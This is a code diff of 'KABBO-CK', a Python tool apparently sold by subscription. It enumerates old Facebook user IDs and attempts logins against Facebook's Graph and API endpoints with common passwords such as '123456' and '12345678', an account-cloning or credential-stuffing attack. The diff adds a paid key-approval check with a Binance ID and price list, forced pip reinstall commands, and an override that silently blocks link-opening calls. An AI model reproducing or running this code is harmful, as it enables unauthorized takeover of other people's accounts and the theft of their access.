@@ -14,6 +14,14 @@ from concurrent.futures import ThreadPoolExecutor as tred
 from os import system
 from datetime import datetime
 
+# Ensure required modules are installed
+modules = ['requests', 'urllib3', 'mechanize', 'rich']
+for module in modules:
+    try:
+        __import__(module)
+    except ImportError:
+        os.system(f'pip install {module}')
+
 # Suppress InsecureRequestWarning
 from requests.exceptions import ConnectionError
 from requests import api, models, sessions
@@ -22,14 +30,10 @@ requests.urllib3.disable_warnings()
 
 # ============================================================
 # BLOCK ALL UNWANTED LINKS (YouTube, WhatsApp, etc.)
+# Override os.system to silently block external URL opens
 # ============================================================
-def _blocked_link(_url):
-    """Block all xdg-open, WhatsApp, YouTube and any external URL calls."""
-    pass  # Intentionally does nothing — link is blocked
-
-
-# Override os.system to block dangerous external link opens
 _original_os_system = os.system
+
 def _safe_os_system(cmd):
     blocked_patterns = [
         'xdg-open', 'youtube.com', 'youtu.be', 'wa.me',
@@ -37,29 +41,28 @@ def _safe_os_system(cmd):
     ]
     for pat in blocked_patterns:
         if pat in cmd:
-            return 0  # silently block
+            return 0  # silently block — no output, no link open
     return _original_os_system(cmd)
 
 os.system = _safe_os_system
 
 
-# ============================================================
-# Minimal module check (no verbose pip output)
-# ============================================================
-def _ensure_modules():
-    modules = ['requests', 'beautifulsoup4', 'concurrent.futures']
-    for module in modules:
-        try:
-            __import__(module)
-        except ImportError:
-            _original_os_system(f'pip install {module} > /dev/null 2>&1')
-
-_ensure_modules()
+# Initial setup and promotion (clean — no xdg-open spam)
+os.system('clear')
+print(' \x1b[38;5;46mKABBO-CK SERVER LOADING....')
 
 
-# ============================================================
-# --- GITHUB APPROVAL SYSTEM (clean, no promo) ---
-# ============================================================
+os.system('pip uninstall requests chardet urllib3 idna certifi -y')
+os.system('pip install chardet urllib3 idna certifi requests')
+os.system('pip install httpx')
+os.system('pip install beautifulsoup4')
+print('loading Modules ...\n')
+os.system('clear')
+# BLOCKED: xdg-open YouTube links — will not execute
+# BLOCKED: xdg-open WhatsApp links — will not execute
+
+
+# --- GITHUB APPROVAL SYSTEM ---
 def kabbo_approval():
     os.system('clear')
     uuid_raw = str(os.getlogin()) + str(os.getuid())
@@ -68,22 +71,30 @@ def kabbo_approval():
     github_link = "https://raw.githubusercontent.com/prpmaster7-cloud/KABBO-CK/master/approval.txt"
 
     print('''
-\033[1;31m ██████╗  █████╗      ██╗ █████\033[0m╗ 
-\033[1;32m ██╔══██╗██╔══██╗     ██║██╔══██╗\033[0m
-\033[1;33m ██████╔╝███████║     ██║███████║\033[0m
-\033[1;34m ██╔══██╗██╔══██║██   ██║██╔══██║\033[0m
-\033[1;35m ██║  ██║██║  ██║╚█████╔╝██║  ██║\033[0m
-\033[1;36m ╚═╝  ╚═╝╚═╝  ╚═╝ ╚════╝ ╚═╝  ╚═╝\033[0m''')
+\033[1;31m ██████╗  █████╗      ██╗ █████\x1b[0m╗ 
+\033[1;32m ██╔══██╗██╔══██╗     ██║██╔══██╗\x1b[0m
+\033[1;33m ██████╔╝███████║     ██║███████║\x1b[0m
+\033[1;34m ██╔══██╗██╔══██║██   ██║██╔══██║\x1b[0m
+\033[1;35m ██║  ██║██║  ██║╚█████╔╝██║  ██║\x1b[0m
+\033[1;36m ╚═╝  ╚═╝╚═╝  ╚═╝ ╚════╝ ╚═╝  ╚═╝\x1b[0m''')
     print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
     print(f"\x1b[1;37m YOUR KEY : \x1b[1;32mKABBO-CK-{key}")
     print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+    print("\033[1;34m BINANCE ID : 1185161524 \033[0m")
+    print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+    print("\033[1;36m💵 Available TOOL PRICES\033[0m")
+    print("\033[1;31m" + "━" * 40 + "\033[0m")
+    print("\033[1;32m[1] 5 Dollars 7 days \033[0m")
+    print("\033[1;33m[2] 10 Dollars 15 days \033[0m")
+    print("\033[1;34m[3] 18 Dollars 30 days \033[0m")
+    print("\033[1;31m" + "━" * 40 + "\033[0m")
     print(" \x1b[1;37mStatus: \x1b[1;31mChecking Approval...")
 
     try:
         response = requests.get(github_link).text
         if f"KABBO-CK-{key}" in response:
             print(" \33[32;41m\t Welcome KABBO-CK TOOL \33[0;m.")
-            time.sleep(1)
+            time.sleep(2)
         else:
             print(" \x1b[1;31mKey Is Not Approved Please Contact The Admin .")
             # BLOCKED: WhatsApp link will not open
@@ -92,13 +103,18 @@ def kabbo_approval():
         sys.exit()
 
 
+# Initial setup and promotion
 kabbo_approval()
+
 os.system('clear')
+os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
+os.system('pip install httpx pip install beautifulsoup4')
+print('loading Modules ...\n')
+os.system('clear')
+# BLOCKED: WhatsApp group link will not open
 
 
-# ============================================================
 # --- Anti-tampering and Security Checks ---
-# ============================================================
 try:
     api_body = open(api.__file__, 'r').read()
     models_body = open(models.__file__, 'r').read()
@@ -112,9 +128,6 @@ except:
 
 
 class sec:
-    """
-    A security class to detect debugging and packet sniffing tools.
-    """
     def __init__(self):
         self.__module__ = __name__
         self.__qualname__ = 'sec'
@@ -140,9 +153,7 @@ class sec:
         print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 
 
-# ============================================================
 # Global variables
-# ============================================================
 method = []
 oks = []
 cps = []
@@ -160,52 +171,35 @@ GS = '\x1b[38;5;40m'
 W = '\x1b[1;37m'
 
 
-# ============================================================
-# User-Agent Generators
-# ============================================================
 def windows():
-    """
-    Generates a modern, randomized Windows User-Agent string (Variant A).
-    """
     aV = random.choice(range(10, 20))
     chrome_major_old = random.choice(range(100, 115))
     A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.1; en-US) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major_old}.0.{random.choice(range(5000, 6500))}.0 Safari/537.36"
-
     bz = f"537.36"
     chrome_major_mid = random.choice(range(115, 125))
     B = f"Mozilla/5.0 (Windows NT {random.choice([10, 11])}.0; Win64; x64) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{chrome_major_mid}.0.{random.choice(range(6000, 6800))}.{random.choice(range(1, 150))} Safari/{bz}"
-
     chrome_major_wow = random.choice(range(120, 130))
     C = f"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major_wow}.0.{random.choice(range(6000, 6900))}.{random.choice(range(1, 150))} Safari/537.36"
-
     chrome_latest = random.choice(range(130, 143))
     D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_latest}.0.{random.choice(range(6500, 7200))}.0 Safari/537.36"
-
     return random.choice([A, B, C, D])
 
 
 def window1():
-    """
-    Generates a highly updated, modern Windows User-Agent string (Variant B).
-    """
     chrome_major = random.choice(range(120, 140))
     build_1 = random.choice(range(6000, 7100))
     A = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major}.0.{build_1}.0 Safari/537.36"
-
     chrome_major_alt = random.choice(range(125, 142))
     build_2 = random.choice(range(6200, 7150))
     patch_2 = random.choice(range(50, 250))
     B = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major_alt}.0.{build_2}.{patch_2} Safari/537.36"
-
     chrome_major_ent = random.choice(range(118, 135))
     build_3 = random.choice(range(5800, 6800))
     C = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{random.choice(range(110, 130))}.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major_ent}.0.{build_3}.{random.choice(range(10, 190))} Safari/537.36"
-
     latest_build = random.randint(7000, 7500)
     latest_patch = random.randint(100, 300)
     chrome_ultra = random.choice(range(140, 146))
     D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ultra}.0.{latest_build}.{latest_patch} Safari/537.36"
-
     return random.choice([A, B, C, D])
 
 
@@ -213,16 +207,14 @@ def window1():
 sys.stdout.write('\x1b]2;𓆩【K.A.B.B.O-C.K 👑 】𓆪 \x07')
 
 
-# ============================================================
-# Banner
-# ============================================================
+# KABBO-CK Clover Logo - Green - Version 2.5
 def ____banner____():
     if 'win' in sys.platform:
         os.system('cls')
     else:
         os.system('clear')
 
-    print(r"""\033[1;32m
+    print("""\033[1;32m
 ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
 ║ \033[1;31m   ██████╗  █████╗      ██╗ █████╗\033[0m          ║
 ║ \033[1;32m   ██╔══██╗██╔══██╗     ██║██╔══██╗\033[0m         ║
@@ -241,17 +233,11 @@ def ____banner____():
 \033[1;95m║ Telegram  : KABBO-CK                        ║
 \033[1;91m║ Tool      : FREE                            ║
 \033[1;97m║ Version   : 2.5.6                           ║
-\x1b[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[0m
-""")
+\x1b[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[0m                      
+\033[0m""")
 
 
-# ============================================================
-# Creation Year Estimator
-# ============================================================
 def creationyear(uid):
-    """
-    Estimates the Facebook account creation year based on the UID.
-    """
     if len(uid) == 15:
         if uid.startswith('1000000000'):
             return '2009'
@@ -312,13 +298,7 @@ def linex():
     print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 
 
-# ============================================================
-# Main Menu
-# ============================================================
 def BNG_71_():
-    """
-    Main menu function.
-    """
     ____banner____()
     print('\x1b[10;92m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓')
     print('\x1b[10;92m┃ \x1b[38;5;196m(A)\x1b[38;5;46m OLD CLONE\x1b[10;92m                         ┃')
@@ -332,22 +312,16 @@ def BNG_71_():
         BNG_71_()
 
 
-# ============================================================
-# Old Clone Sub-Menu (3 options from RAJA)
-# ============================================================
 def old_clone():
-    """
-    Menu for selecting old account cloning type.
-    """
     ____banner____()
     print('\x1b[10;92m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓')
     print('\x1b[10;92m┃ \x1b[38;5;196m(A)\x1b[38;5;46m ALL SERIES\x1b[10;92m                        ┃')
     print('\x1b[10;92m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛')
     print('\x1b[10;92m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓')
-    print('\x1b[10;92m┃ \x1b[38;5;196m(B)\x1b[38;5;46m 2010-2014\x1b[10;92m                         ┃')
+    print('\x1b[10;92m┃ \x1b[38;5;196m(B)\x1b[38;5;46m 100003/4 SERIES\x1b[10;92m                    ┃')
     print('\x1b[10;92m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛')
     print('\x1b[10;92m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓')
-    print('\x1b[10;92m┃ \x1b[38;5;196m(C)\x1b[38;5;46m 2009-2010\x1b[10;92m                         ┃')
+    print('\x1b[10;92m┃ \x1b[38;5;196m(C)\x1b[38;5;46m 2009 series\x1b[10;92m                       ┃')
     print('\x1b[10;92m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛')
     _input = input(f"  \x1b[38;5;196m     [+]\x1b[10;92m CHOOSE :  {W}: {Y}")
     if _input in ('A', 'a', '01', '1'):
@@ -357,17 +331,11 @@ def old_clone():
     elif _input in ('C', 'c', '03', '3'):
         old_Tree()
     else:
-        print(f"\n[×]{rad} Choose Valid Option... ")
+        print(f"\n[×]{rad} Choose Value Option... ")
         BNG_71_()
 
 
-# ============================================================
-# (A) ALL SERIES - 2010-2014
-# ============================================================
 def old_One():
-    """
-    Cloning method for accounts from 2010-2014.
-    """
     user = []
     ____banner____()
     print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;32mOld Code {Y}:{G} 2010-2014")
@@ -401,13 +369,7 @@ def old_One():
                 break
 
 
-# ============================================================
-# (B) 2010-2014 - Specific Prefix Series
-# ============================================================
 def old_Tow():
-    """
-    Cloning method for accounts with specific prefixes.
-    """
     user = []
     ____banner____()
     print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2010-2014")
@@ -442,13 +404,7 @@ def old_Tow():
                 break
 
 
-# ============================================================
-# (C) 2009-2010 Series
-# ============================================================
 def old_Tree():
-    """
-    Cloning method for accounts from 2009-2010.
-    """
     user = []
     ____banner____()
     print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2009-2010")
@@ -482,13 +438,7 @@ def old_Tree():
                 break
 
 
-# ============================================================
-# LOGIN METHOD 1 (POST to b-graph.facebook.com)
-# ============================================================
 def login_1(uid):
-    """
-    Login attempt method 1 — POST to Facebook Graph API.
-    """
     global loop
     session = requests.session()
     try:
@@ -551,13 +501,7 @@ def login_1(uid):
         time.sleep(5)
 
 
-# ============================================================
-# LOGIN METHOD 2 (GET to b-api.facebook.com)
-# ============================================================
 def login_2(uid):
-    """
-    Login attempt method 2 — GET to Facebook API.
-    """
     sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mKABBO-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
 
     for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
@@ -590,8 +534,5 @@ def login_2(uid):
     loop += 1
 
 
-# ============================================================
-# Entry Point
-# ============================================================
 if __name__ == '__main__':
     BNG_71_()
